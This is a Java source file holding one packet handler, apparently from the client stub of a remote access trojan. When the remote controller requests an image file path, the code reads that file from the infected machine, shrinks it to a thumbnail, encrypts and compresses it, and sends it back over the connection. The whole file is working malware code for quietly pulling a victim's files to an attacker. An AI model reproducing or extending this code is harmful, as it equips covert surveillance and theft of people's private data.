package com.redpois0n.stub.packets.incoming;

import java.awt.image.BufferedImage;
import java.io.File;

import javax.imageio.ImageIO;

import com.redpois0n.common.compress.GZip;
import com.redpois0n.common.crypto.Crypto;
import com.redpois0n.stub.Connection;
import com.redpois0n.stub.Main;
import com.redpois0n.stub.RemoteScreen;
import com.redpois0n.stub.packets.outgoing.Packet59ThumbnailPreview;
import com.redpois0n.stub.utils.ImageUtils;

public class Packet85ThumbnailPreview extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {		
		String file = Connection.readLine();

		Connection.addToSendQueue(new Packet59ThumbnailPreview(file));
		
		BufferedImage screenShot = ImageIO.read(new File(file));
		screenShot = RemoteScreen.resize(screenShot, 150, 100);
		byte[] buffer = ImageUtils.encodeImage(screenShot, 1F);
		buffer = GZip.compress(Crypto.encrypt(buffer, Main.getKey()));
		Connection.dos.writeInt(buffer.length);
		Connection.dos.write(buffer);

		Connection.lock();
	}

}
